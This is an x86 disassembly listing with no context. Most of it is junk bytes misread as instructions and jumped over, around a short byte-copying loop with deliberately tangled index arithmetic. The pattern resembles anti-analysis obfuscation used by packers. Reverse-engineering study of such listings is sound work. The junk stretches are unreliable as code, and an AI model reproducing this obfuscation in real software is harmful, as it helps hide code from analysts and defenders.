  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	test   cl,cl
  411ce3:	cld    
  411ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce5:	mov    WORD PTR [eax-0x42],fs
  411ce8:	mov    esi,0xbebec28e
  411ced:	inc    ebp
  411cef:	lods   eax,DWORD PTR ds:[esi]
  411cf0:	xchg   ebx,eax
  411cf1:	inc    esi
  411cf2:	pop    eax
  411cf3:	adc    eax,0x5ca7c612
  411cf8:	xchg   esp,eax
  411cf9:	loopne 0x411cb5
  411cfb:	jb     0x411ca0
  411cfd:	and    edi,DWORD PTR [ebx]
  411cff:	pop    es
  411d00:	arpl   WORD PTR [ebp+0x1c35e24a],cx
  411d06:	nop
  411d07:	xchg   esi,eax
  411d08:	pop    esp
  411d09:	cmp    BYTE PTR es:[eax+0x59],ah
  411d0d:	dec    ebx
  411d0e:	jge    0x411ca7
  411d10:	sub    BYTE PTR [esi],bh
  411d12:	repz mov bl,0x7b
  411d15:	(bad)  [eax+0x5fadd229]
  411d1b:	jns    0x411cfb
  411d1d:	jbe    0x411d64
  411d1f:	in     al,0x8
  411d21:	int    0x1d
  411d23:	add    dl,bh
  411d25:	pop    ds
  411d26:	jmp    0xeac8:0x53fa8f5b
  411d2d:	(bad)  
  411d2e:	push   ds
  411d2f:	retf   0x77ef
  411d32:	xor    DWORD PTR [ecx],eax
  411d34:	fnstenv [ebp-0x6f]
  411d37:	shl    DWORD PTR [edi+0xc11682d],cl
  411d3d:	and    DWORD PTR ds:0xbf5973d6,ebp
  411d43:	(bad)  
  411d44:	adc    BYTE PTR [edi],ah
  411d46:	mov    dl,0x4f
  411d48:	dec    esi
  411d49:	std    
  411d4a:	mov    al,0xf2
  411d4c:	fwait
  411d4d:	inc    eax
  411d4e:	mov    ds:0x59ab0e3f,eax
  411d53:	in     eax,0xde
  411d55:	fild   QWORD PTR ds:0x5356772f
  411d5b:	int    0x11
  411d5d:	dec    edi
  411d5e:	mov    al,ds:0x7b6f1f56
  411d63:	jmp    0xaf80:0xe101
  411d69:	and    eax,DWORD PTR [ecx]
  411d6b:	fmul   st(7),st
  411d6d:	test   BYTE PTR ds:0xfc188020,dh
  411d73:	aas    
  411d74:	aas    
  411d75:	int    0x2a
  411d77:	xchg   ebx,eax
  411d78:	cs js  0x411d06
  411d7b:	cld    
  411d7c:	xor    eax,0x7e1ddea2
  411d81:	and    edi,edi
  411d83:	mov    eax,0xc8b696d
  411d88:	fwait
  411d89:	cmp    al,0x1a
  411d8b:	pop    ds
  411d8c:	push   ds
  411d8d:	mov    al,0xb7
  411d8f:	fiadd  WORD PTR [esi-0x175bc990]
  411d95:	jmp    0x57a06008
  411d9a:	ret    0xdcef
  411d9d:	and    edx,DWORD PTR [eax-0x50]
  411da0:	inc    ebx
  411da1:	ret    0xb570
  411da4:	daa    
  411da5:	xchg   dh,ah
  411da7:	or     ebp,DWORD PTR [eax]
  411da9:	xor    eax,DWORD PTR [eax-0x3a7258e3]
  411daf:	in     al,dx
  411db0:	jmp    0xc8c2:0x21968785
  411db7:	dec    edx
  411db8:	sbb    dh,BYTE PTR [ecx]
  411dba:	lods   eax,DWORD PTR ds:[esi]
  411dbb:	loopne 0x411d3f
  411dbd:	mov    bh,0x84
  411dbf:	out    0xc4,eax
  411dc1:	or     BYTE PTR [edi+0x5b1aff5d],ch
  411dc7:	test   DWORD PTR [ebx-0x22],ebp
  411dca:	cmp    ah,bl
  411dcc:	setns  BYTE PTR [esi*4+0x553a2ec4]
  411dd4:	out    dx,eax
  411dd5:	shl    ah,0x7b
  411dd8:	jns    0x411e2b
  411dda:	pop    edx
  411ddb:	inc    ebp
  411ddc:	cmp    eax,0xc7361416
  411de1:	test   al,0xbc
  411de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411de4:	aad    0xe0
  411de6:	jns    0x411e61
  411de8:	mov    al,0x7b
  411dea:	xchg   ecx,eax
  411deb:	mov    bl,0x3b
  411ded:	inc    edi
  411dee:	sbb    eax,0x534c0e93
  411df3:	pushw  es
  411df5:	mov    ds:0xd87e8ddb,al
  411dfa:	mov    al,bl
  411dfc:	fisubr DWORD PTR [edi-0x1a7a22d9]
  411e02:	bound  eax,QWORD PTR [edi-0x3f]
  411e05:	pusha  
  411e06:	lds    edi,FWORD PTR [esi]
  411e08:	jns    0x411e0d
  411e0a:	xchg   esp,eax
  411e0b:	xor    BYTE PTR [edi+0x78],bh
  411e0e:	dec    ebx
  411e0f:	pop    eax
  411e10:	(bad)  
  411e11:	adc    ebx,esp
  411e13:	fmul   DWORD PTR ds:0xa27dc6fd
  411e19:	add    al,0x53
  411e1b:	and    DWORD PTR [edx+edi*2+0x52b3c0f],edi
  411e22:	jl     0x411e10
  411e24:	add    DWORD PTR [edx],0x2b
  411e27:	int3   
  411e28:	mov    dh,cl
  411e2a:	mov    WORD PTR [ecx],fs
  411e2c:	xchg   eax,ebp
  411e2e:	adc    al,0xd3
  411e30:	iret   
  411e31:	lods   al,BYTE PTR ds:[esi]
  411e32:	outs   dx,BYTE PTR ds:[esi]
  411e33:	repnz inc eax
  411e35:	cmp    dl,dl
  411e37:	jmp    0x411eb0
  411e39:	inc    eax
  411e3a:	nop
  411e3b:	mov    dl,BYTE PTR [edi-0x37d98c0]
  411e41:	lea    ebx,[eax]
  411e43:	call   0xbc63:0xeda19cb7
  411e4a:	stos   BYTE PTR es:[edi],al
  411e4b:	dec    eax
  411e4c:	dec    eax
  411e4d:	pop    edx
  411e4e:	xlat   BYTE PTR ds:[ebx]
  411e4f:	jns    0x411e63
  411e51:	bound  ebx,QWORD PTR [ebx+0xcc03666]
  411e57:	fwait
  411e58:	jae    0x411eb8
  411e5a:	loope  0x411e88
  411e5c:	das    
  411e5d:	rcl    BYTE PTR [ebx+ebp*8-0x3c],0x1a
  411e62:	sbb    al,0x76
  411e64:	pop    ebp
  411e65:	jbe    0x411ee2
  411e67:	(bad)  [eax]
  411e69:	retf   
  411e6a:	in     al,dx
  411e6b:	mov    cs,WORD PTR [esi-0x1275f963]
  411e71:	div    BYTE PTR [ecx]
  411e73:	loop   0x411e96
  411e75:	bnd jge 0x411eb6
  411e78:	jge    0x411e48
  411e7a:	(bad)  
  411e7b:	jnp    0x411ea1
  411e7d:	sub    DWORD PTR [esi+eax*2+0x6d],esi
  411e81:	outs   dx,DWORD PTR ds:[esi]
  411e82:	pop    DWORD PTR [edx-0x226d2644]
  411e88:	or     cl,BYTE PTR [eax+esi*8]
  411e8b:	clc    
  411e8c:	or     DWORD PTR [edx+0x61],edx
  411e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e90:	add    DWORD PTR [edx],0x685d8922
  411e96:	ds loopne 0x411e68
  411e99:	sbb    ebx,esp
  411e9b:	in     al,0x74
  411e9d:	adc    BYTE PTR [edi+0x36fcc8f6],dl
  411ea3:	mov    ebx,0x2b5c94b
  411ea8:	inc    esp
  411ea9:	pushf  
  411eaa:	and    BYTE PTR [ecx-0x6e],dh
  411ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eae:	loop   0x411ef8
  411eb0:	jl     0x411e8d
  411eb2:	sti    
  411eb3:	mov    esp,0xaca995e0
  411eb8:	lea    edi,[ebx]
  411eba:	dec    edx
  411ebb:	mov    ebx,0x93670ab
  411ec0:	aam    0xe4
  411ec2:	repnz (bad) 
  411ec4:	jl     0x411ebc
  411ec6:	xchg   ebx,eax
  411ec7:	pusha  
  411ec8:	ins    DWORD PTR es:[edi],dx
  411ec9:	pushf  
  411eca:	idiv   DWORD PTR [ebx-0x3a]
  411ecd:	leave  
  411ece:	cmc    
  411ecf:	xchg   ecx,eax
  411ed0:	and    eax,0xfe45773b
  411ed5:	hlt    
  411ed6:	xchg   ebp,eax
  411ed7:	in     eax,0x3e
  411ed9:	cmc    
  411eda:	sub    edi,ecx
  411edc:	mov    eax,0x3b5cf85e
  411ee1:	pop    ebx
  411ee2:	adc    esi,DWORD PTR [edi-0x27]
  411ee5:	std    
  411ee6:	shl    DWORD PTR ds:0x6aa323f1,cl
  411eec:	arpl   WORD PTR [ebp+ecx*1-0x7a],cx
  411ef0:	dec    esi
  411ef1:	add    BYTE PTR [ebx+edx*2-0x1068a59d],0x7a
  411ef9:	loopne 0x411f0c
  411efb:	test   eax,0xa26b8cda
  411f00:	cmp    al,0xe4
  411f02:	xchg   DWORD PTR [edi-0x3669fb59],esi
  411f08:	stos   DWORD PTR es:[edi],eax
  411f09:	inc    esi
  411f0a:	mov    al,0x58
  411f0c:	hlt    
  411f0d:	mov    ds:0xb49f082e,al
  411f12:	out    dx,eax
  411f13:	std    
  411f14:	sbb    BYTE PTR [ecx-0x523e4f2],cl
  411f1a:	daa    
  411f1b:	test   DWORD PTR [ebp-0x14],0x74708427
  411f22:	sar    ch,0xe8
  411f25:	fnstcw WORD PTR [esi+0x5d]
  411f28:	and    BYTE PTR ds:0x491d7076,bh
  411f2e:	retf   
  411f2f:	sbb    esi,DWORD PTR [esi+edi*8-0x5]
  411f33:	fwait
  411f34:	push   ebp
  411f35:	imul   esp,DWORD PTR [edi-0x68],0xa
  411f39:	push   ecx
  411f3a:	or     BYTE PTR [edx-0x7f3dc667],al
  411f40:	mov    ds:0xb61fa3bd,al
  411f45:	pop    esi
  411f46:	inc    ebx
  411f47:	ins    DWORD PTR es:[edi],dx
  411f48:	cwde   
  411f49:	adc    BYTE PTR [eax-0x7d],bl
  411f4c:	add    BYTE PTR [ecx-0x10],bl
  411f4f:	mov    cl,0xec
  411f51:	push   eax
  411f52:	dec    esi
  411f53:	or     ch,BYTE PTR [esi+0x49]
  411f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f57:	clc    
  411f58:	stos   BYTE PTR es:[edi],al
  411f59:	aam    0x65
  411f5b:	imul   edi,DWORD PTR [edx],0xac591300
  411f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f62:	test   dh,al
  411f64:	sub    al,0x75
  411f66:	ins    DWORD PTR es:[edi],dx
  411f67:	daa    
  411f68:	in     al,dx
  411f69:	mov    dh,0xbf
  411f6b:	ins    DWORD PTR es:[edi],dx
  411f6c:	mov    ecx,es
  411f6e:	test   eax,0x5c4ce065
  411f73:	mov    cl,0xa4
  411f75:	mov    cl,0x3b
  411f77:	adc    eax,0x91daf1f2
  411f7c:	push   0x55
  411f7e:	mov    bl,BYTE PTR [ecx]
  411f80:	xor    DWORD PTR [ebp+0x56],ebx
  411f83:	mov    eax,0x671a6614
  411f88:	dec    edi
  411f89:	ins    DWORD PTR es:[edi],dx
  411f8a:	loop   0x411f0d
  411f8c:	iret   
  411f8d:	sub    ah,bh
  411f8f:	jae    0x411fd0
  411f91:	out    dx,al
  411f92:	mov    edi,ds
  411f94:	test   ecx,esi
  411f96:	jle    0x411f64
  411f98:	fsub   st(0),st
  411f9a:	mov    ds:0xbc2788e3,eax
  411f9f:	pop    ds
  411fa0:	dec    esp
  411fa1:	cld    
  411fa2:	sti    
  411fa3:	js     0x411f73
  411fa5:	mov    al,0x30
  411fa7:	ja     0x411fb1
  411fa9:	out    0x1,al
  411fab:	xor    al,0x85
  411fad:	cmp    eax,0x8b89b8f2
  411fb2:	jmp    0x412025
  411fb4:	jecxz  0x411fe9
  411fb6:	mov    BYTE PTR [esp+ebp*8+0x5c903346],0x82
  411fbe:	mov    ebx,0x26327e
  411fc3:	cwde   
  411fc4:	mov    eax,ds:0xd28dad69
  411fc9:	pop    ecx
  411fca:	jne    0x412021
  411fcc:	daa    
  411fcd:	xchg   ebp,eax
  411fce:	push   ebx
  411fcf:	je     0x411fc5
  411fd1:	es mov esi,0xfaf4f67a
  411fd7:	ror    DWORD PTR [eax],1
  411fd9:	imul   eax,eax,0x43bd290
  411fdf:	and    eax,edx
  411fe1:	or     eax,0x1a40
  411fe6:	xor    eax,0x1ac1
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	icebp  
  412019:	xchg   ebx,eax
  41201a:	nop
  41201b:	nop
  41201c:	pop    esp
  41201d:	mov    si,0x8ebe
  412021:	ret    0xbebe
  412024:	dec    eax
  412025:	and    eax,DWORD PTR [edx+eax*8]
  412028:	inc    ecx
  412029:	or     bl,BYTE PTR ds:0xc573bd71
  41202f:	fwait
  412030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412031:	jno    0x41203e
  412033:	hlt    
  412034:	dec    ebp
  412035:	gs ja  0x4120a6
  412038:	dec    ecx
  412039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41203a:	rcl    DWORD PTR [edx],1
  41203c:	nop
  41203d:	hlt    
  41203e:	retf   
  41203f:	dec    ebx
  412040:	xor    ecx,eax
  412042:	lods   al,BYTE PTR ds:[esi]
  412043:	xchg   ecx,eax
  412044:	test   DWORD PTR [ebp-0x30],ecx
  412047:	sbb    BYTE PTR [ebx],cl
  412049:	or     ah,BYTE PTR [edi+0x4d0269ef]
  41204f:	pop    ss
  412050:	mov    esi,0x71d4612a
  412055:	push   eax
  412056:	retf   
  412057:	inc    eax
  412058:	push   edx
  412059:	arpl   WORD PTR [eax],si
  41205b:	(bad)  
  41205c:	ins    DWORD PTR es:[edi],dx
  41205d:	dec    edi
  41205e:	out    0x2d,al
  412060:	fcomp  DWORD PTR [edx]
  412062:	cmp    esi,DWORD PTR [ebp+0x39]
  412065:	lds    ebp,FWORD PTR [esi-0x3b]
  412068:	(bad)  
  412069:	sbb    ebx,ecx
  41206b:	sub    dh,BYTE PTR [eax]
  41206d:	fisttp QWORD PTR [ecx+0x2b]
  412070:	mov    bl,0xd4
  412072:	loope  0x412086
  412074:	jg     0x41201f
  412076:	xchg   edi,eax
  412077:	(bad)  
  412078:	ror    cl,1
  41207a:	daa    
  41207b:	mov    ds:0x94097e43,al
  412080:	cwde   
  412081:	add    ebp,DWORD PTR [ebx]
  412083:	jns    0x41205e
  412085:	fdiv   DWORD PTR [edi]
  412087:	cli    
  412088:	out    0x2,eax
  41208a:	mov    ebx,0x980a41b8
  41208f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412090:	jle    0x41209a
  412092:	repz pop ds
  412094:	pop    es
  412095:	adc    edi,eax
  412097:	repz out dx,al
  412099:	sub    eax,0xbd0dd70f
  41209e:	call   0x32999bba
  4120a3:	cmp    cl,BYTE PTR [ebp+0x26b18df9]
  4120a9:	push   esp
  4120aa:	es jae 0x412045
  4120ad:	cwde   
  4120ae:	push   ebx
  4120af:	mov    ch,0x29
  4120b1:	pushf  
  4120b2:	aad    0xcc
  4120b4:	mov    ch,0xbe
  4120b6:	inc    ecx
  4120b7:	aam    0x58
  4120b9:	outs   dx,DWORD PTR ds:[esi]
  4120ba:	and    al,0x74
  4120bc:	(bad)  
  4120bd:	aam    0xf6
  4120bf:	mov    al,ds:0xf3f20f70
  4120c4:	sbb    ch,BYTE PTR [ebx-0x43]
  4120c7:	imul   eax,DWORD PTR [eax-0xa],0xfffffffd
  4120cb:	ss out dx,al
  4120cd:	add    edx,esi
  4120cf:	sub    edx,edi
  4120d1:	out    dx,eax
  4120d2:	mov    eax,DWORD PTR [ebx-0x4e267f30]
  4120d8:	adc    eax,esp
  4120da:	inc    eax
  4120db:	adc    BYTE PTR [ecx-0x42],ah
  4120de:	inc    ecx
  4120df:	inc    edi
  4120e0:	dec    eax
  4120e1:	cmp    BYTE PTR [ebp-0x5727bf10],bh
  4120e7:	xor    ch,al
  4120e9:	pusha  
  4120ea:	add    BYTE PTR ds:0x1edfbae1,al
  4120f0:	xor    eax,ebp
  4120f2:	pop    edi
  4120f3:	test   DWORD PTR [ebp-0x71],ebx
  4120f6:	jb     0x4120a3
  4120f8:	xor    edi,DWORD PTR [edi-0x74]
  4120fb:	and    ecx,DWORD PTR [edx+0xcb3e73e]
  412101:	sbb    esp,DWORD PTR [esi]
  412103:	jno    0x4120e3
  412105:	push   ebp
  412106:	mov    bh,0xa
  412108:	cmp    ch,al
  41210a:	mov    ah,0x26
  41210d:	cmp    DWORD PTR [eax+0x2b74c746],0x8651ff
  412117:	mov    bh,BYTE PTR ds:0x7e2da6df
  41211d:	add    eax,0x6c72cc99
  412122:	fistp  DWORD PTR [edx-0x305ce233]
  412128:	lahf   
  412129:	jmp    0x41214e
  41212b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41212c:	test   DWORD PTR [edx-0x3d1f585b],0x4b9270e4
  412136:	fnsave [edi-0x5e]
  412139:	mov    dh,0x8
  41213b:	xchg   ebp,eax
  41213c:	pusha  
  41213d:	je     0x412106
  41213f:	(bad)  
  412140:	lea    edx,[ebp-0x7a]
  412143:	jno    0x4120f8
  412145:	jecxz  0x41219f
  412147:	call   0xf004a9a3
  41214c:	popa   
  41214d:	jne    0x4120fc
  41214f:	adc    ecx,DWORD PTR [eax+0x1a]
  412152:	sub    eax,0xe50a4613
  412157:	or     cl,BYTE PTR [ebp-0x762ed944]
  41215d:	xchg   BYTE PTR [esp+0x4b6ab0ab],al
  412164:	add    ah,BYTE PTR [edi]
  412166:	or     al,0x95
  412168:	pop    ebp
  412169:	push   0xc
  41216b:	js     0x412188
  41216d:	test   DWORD PTR [esi],edx
  41216f:	nop
  412170:	lock xchg DWORD PTR [ebx+edi*2],ecx
  412174:	shr    DWORD PTR [edi+0x7f],0xb7
  412178:	or     DWORD PTR [ebp+0x35159673],ebp
  41217e:	jb     0x41212b
  412180:	mov    ebx,0xc9bb410f
  412185:	pop    ss
  412186:	leave  
  412187:	mov    ch,0xe8
  412189:	inc    ebx
  41218a:	jmp    0xf018:0xf07cdbf3
  412191:	es pop ebx
  412193:	test   BYTE PTR [ebx],dl
  412195:	les    ecx,FWORD PTR [edx-0x1f44190e]
  41219b:	pop    ecx
  41219c:	mov    bl,0x51
  41219e:	cmp    bl,al
  4121a0:	dec    eax
  4121a1:	int3   
  4121a2:	add    DWORD PTR [ecx+0x24ba7d73],ebp
  4121a8:	loopne 0x4121f2
  4121aa:	int    0xd8
  4121ac:	sar    BYTE PTR [edi+0x4d],0xbd
  4121b0:	push   0x31
  4121b2:	(bad)  
  4121b3:	(bad)  
  4121b4:	fsubr  QWORD PTR [edx-0x7c]
  4121b7:	cdq    
  4121b8:	rcl    DWORD PTR [eax+ebx*8+0x6d],1
  4121bc:	inc    esi
  4121bd:	cmp    DWORD PTR [ecx+0x3d],ebx
  4121c0:	daa    
  4121c1:	std    
  4121c2:	push   edi
  4121c3:	push   eax
  4121c4:	mov    DWORD PTR [ecx],eax
  4121c6:	mov    cl,0xcf
  4121c8:	jb     0x41216f
  4121ca:	scas   al,BYTE PTR es:[edi]
  4121cb:	inc    ebx
  4121cc:	xor    al,0x8d
  4121ce:	(bad)  
  4121cf:	xor    esp,DWORD PTR [eax]
  4121d1:	test   eax,0x5b81a628
  4121d6:	jge    0x41221c
  4121d8:	xchg   BYTE PTR [ecx],ah
  4121da:	imul   esi,DWORD PTR [esi+0x17],0xffffffed
  4121de:	jmp    0x4121c2
  4121e0:	push   esi
  4121e1:	dec    esp
  4121e2:	aas    
  4121e3:	mov    dl,BYTE PTR [bp+di]
  4121e6:	mov    bl,0xf
  4121e8:	add    BYTE PTR [esi+edi*8-0x5b],cl
  4121ec:	mov    esp,0xeeb4cfda
  4121f1:	lods   al,BYTE PTR ds:[esi]
  4121f2:	pop    ebp
  4121f3:	mov    dl,0xdc
  4121f5:	in     eax,0x33
  4121f7:	dec    edx
  4121f8:	or     al,0x19
  4121fa:	fsub   QWORD PTR [ebp+0x26d78c71]
  412200:	and    dh,BYTE PTR ds:0x76762d3c
  412206:	sub    al,0x1c
  412208:	xor    dh,cl
  41220a:	lods   al,BYTE PTR ds:[esi]
  41220b:	jb     0x4121f7
  41220d:	lahf   
  41220e:	fst    QWORD PTR [ebx-0x59]
  412211:	inc    edx
  412212:	jge    0x4121bb
  412214:	pop    esi
  412215:	mov    esi,0x6e06e6de
  41221a:	push   0x1c
  41221c:	les    ebp,FWORD PTR [edi-0x25]
  41221f:	xchg   esp,eax
  412220:	xchg   edx,eax
  412221:	int    0x83
  412223:	fisubr DWORD PTR [ebp-0x3a6fa04e]
  412229:	or     DWORD PTR [ecx+0x22],esi
  41222c:	leave  
  41222d:	cmc    
  41222e:	jge    0x4122a0
  412230:	popa   
  412231:	sbb    BYTE PTR [ebx],al
  412233:	push   edi
  412234:	push   eax
  412235:	cmp    al,al
  412237:	shl    BYTE PTR [edi],1
  412239:	inc    esp
  41223a:	cld    
  41223b:	popa   
  41223c:	mov    BYTE PTR [ebx],0x27
  41223f:	jne    0x412204
  412241:	ja     0x412244
  412243:	and    DWORD PTR [ebx+ecx*8-0x2cd32035],ebp
  41224a:	or     BYTE PTR [ebx+ecx*1+0x2661e3c3],ah
  412251:	push   edi
  412252:	sbb    eax,0xe9f98557
  412257:	cld    
  412258:	mov    ds:0x65274b72,al
  41225d:	leave  
  41225e:	xor    BYTE PTR [ebp-0x38af4dc],al
  412264:	dec    eax
  412265:	inc    ebp
  412266:	outs   dx,DWORD PTR ds:[esi]
  412267:	xchg   esi,eax
  412268:	add    al,0x97
  41226a:	and    DWORD PTR [ebx],0x7f
  41226d:	out    dx,eax
  41226e:	inc    edi
  41226f:	sbb    ah,BYTE PTR [edx-0x26967cc4]
  412275:	xchg   edx,eax
  412276:	jae    0x412209
  412278:	cwde   
  412279:	icebp  
  41227a:	es push ecx
  41227c:	in     eax,0x63
  41227e:	test   eax,0xfe6c682e
  412283:	data16 daa 
  412285:	mov    edi,0xcc9bdc8e
  41228a:	je     0x412281
  41228c:	out    0x35,eax
  41228e:	jne    0x412215
  412290:	(bad)  
  412291:	(bad)  
  412292:	sbb    dl,BYTE PTR [edi-0x136513a9]
  412298:	mov    ?,WORD PTR [esi]
  41229a:	cmp    ecx,DWORD PTR [edi+0x59]
  41229d:	mov    dl,0x58
  41229f:	stos   BYTE PTR es:[edi],al
  4122a0:	dec    ebx
  4122a1:	pop    ecx
  4122a2:	pop    ebx
  4122a3:	clc    
  4122a4:	push   esi
  4122a5:	mov    edx,eax
  4122a7:	jbe    0x4122aa
  4122a9:	pop    ebx
  4122aa:	in     al,0xfc
  4122ac:	push   cs
  4122ad:	cli    
  4122ae:	xchg   edi,eax
  4122af:	stos   BYTE PTR es:[edi],al
  4122b0:	pop    edx
  4122b1:	std    
  4122b2:	mov    edx,0xcc7491ee
  4122b7:	call   0x6a0826ae
  4122bc:	jl     0x4122b1
  4122be:	push   ss
  4122bf:	imul   eax,DWORD PTR ss:[esi],0xdf5dd75a
  4122c6:	lds    edx,FWORD PTR [ecx-0x3c7ec974]
  4122cc:	add    eax,0x508948e6
  4122d1:	mov    bh,0x72
  4122d3:	sbb    dl,BYTE PTR [edi+0x4c]
  4122d6:	mul    DWORD PTR [ebp-0x3]
  4122d9:	xor    ch,BYTE PTR [esi-0x5e]
  4122dc:	dec    edx
  4122dd:	out    0x82,al
  4122df:	push   ebp
  4122e0:	xor    cl,BYTE PTR [esi]
  4122e2:	dec    esi
  4122e3:	jmp    0x412297
  4122e5:	adc    BYTE PTR [edi],0x89
  4122e8:	dec    ebp
  4122e9:	sub    DWORD PTR [ebx-0x26],ebx
  4122ec:	mov    BYTE PTR ds:0x8dd1808,0x90
  4122f3:	sub    ch,BYTE PTR [edx]
  4122f5:	jne    0x412317
  4122f7:	add    BYTE PTR [edx-0x2a],cl
  4122fa:	cmp    eax,0xaa3a4763
  4122ff:	mov    ebx,ecx
  412301:	cmp    ebp,ebp
  412303:	xchg   edi,eax
  412305:	nop
  412306:	shl    BYTE PTR [eax],cl
  412308:	rol    BYTE PTR [eax-0x5f],1
  41230b:	(bad)  
  41230c:	mov    ah,0xe9
  41230e:	in     eax,0xe5
  412310:	xor    edx,0x7015
  412316:	sub    eax,edx
  412318:	mov    edx,DWORD PTR [ebp-0x28]
  41231b:	mov    esi,DWORD PTR [ebp-0x2c]
  41231e:	and    edx,0x2a7b
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	jmp    0x412345
  412366:	fs sahf 
  412368:	sub    al,0x6c
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x894d70a0
  412374:	sbb    dl,BYTE PTR [edx]
  412376:	xchg   BYTE PTR [edx],dh
  412378:	and    dh,BYTE PTR [ebp+0x748fb6d9]
  41237e:	inc    ebx
  41237f:	jmp    0xfb40:0x1768be5
  412386:	pop    edi
  412387:	nop
  412388:	inc    esi
  412389:	pop    ecx
  41238a:	test   ebp,edi
  41238c:	(bad)  
  41238d:	repnz (bad) 
  412390:	fisub  DWORD PTR [edi+eax*2]
  412393:	jno    0x41236f
  412395:	jmp    DWORD PTR [edi]
  412397:	sub    DWORD PTR [ebx],eax
  412399:	test   BYTE PTR [esi],dh
  41239b:	xchg   esp,eax
  41239c:	lahf   
  41239d:	dec    ebx
  41239e:	add    DWORD PTR [ebp+0x46f684e9],eax
  4123a4:	dec    esi
  4123a5:	xchg   edx,eax
  4123a6:	ud1    edi,DWORD PTR [esi+0x36]
  4123aa:	xchg   esi,eax
  4123ab:	mov    eax,ds:0x77ff0ede
  4123b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b1:	aad    0xe9
  4123b3:	and    dh,BYTE PTR [ebp+0x7a]
  4123b6:	aas    
  4123b7:	daa    
  4123b8:	outs   dx,BYTE PTR ds:[esi]
  4123b9:	sub    eax,DWORD PTR [eax-0x46]
  4123bc:	sti    
  4123bd:	mov    eax,0xf9f5c1d2
  4123c2:	push   esi
  4123c3:	sbb    eax,DWORD PTR [eax+ebp*1]
  4123c6:	mov    bh,0x56
  4123c8:	pop    ecx
  4123c9:	jno    0x4123fd
  4123cb:	inc    esi
  4123cc:	out    dx,al
  4123cd:	sti    
  4123ce:	ds (bad) 
  4123d0:	(bad)  
  4123d1:	xor    edx,ebx
  4123d3:	fisttp WORD PTR [ecx+0x2c]
  4123d6:	push   ecx
  4123d7:	icebp  
  4123d8:	cmp    BYTE PTR [edx],dl
  4123da:	retf   0xc4dc
  4123dd:	push   es
  4123de:	push   esi
  4123df:	es push cs
  4123e1:	mov    ah,0x69
  4123e3:	jbe    0x41238f
  4123e5:	loope  0x4123c1
  4123e7:	adc    eax,0x256f72f4
  4123ec:	or     al,0x27
  4123ee:	xchg   BYTE PTR [ebx],bh
  4123f0:	in     al,0x48
  4123f2:	hlt    
  4123f3:	addr16 inc eax
  4123f5:	enter  0x850c,0xb7
  4123f9:	or     al,0x3b
  4123fb:	xor    al,cl
  4123fd:	cld    
  4123fe:	xchg   BYTE PTR [eax+0x1b863e4e],bl
  412404:	adc    edx,esp
  412406:	sar    BYTE PTR es:[ecx],cl
  412409:	and    ebp,eax
  41240b:	fcom   QWORD PTR [ecx]
  41240d:	xchg   DWORD PTR ds:0x6fb03a44,esp
  412413:	pop    ebp
  412414:	mov    ch,0xf
  412416:	mov    edx,0xab2a8827
  41241b:	stos   BYTE PTR es:[edi],al
  41241c:	arpl   cx,sp
  41241e:	loop   0x412438
  412420:	(bad)  
  412421:	ins    BYTE PTR es:[edi],dx
  412422:	popa   
  412423:	mov    al,0xac
  412425:	jmp    0x412466
  412427:	shr    BYTE PTR [eax-0x2012eab8],1
  41242d:	mov    al,0xf2
  41242f:	repnz cmp BYTE PTR [eax-0x25],cl
  412433:	xor    al,0x35
  412435:	sub    ch,dh
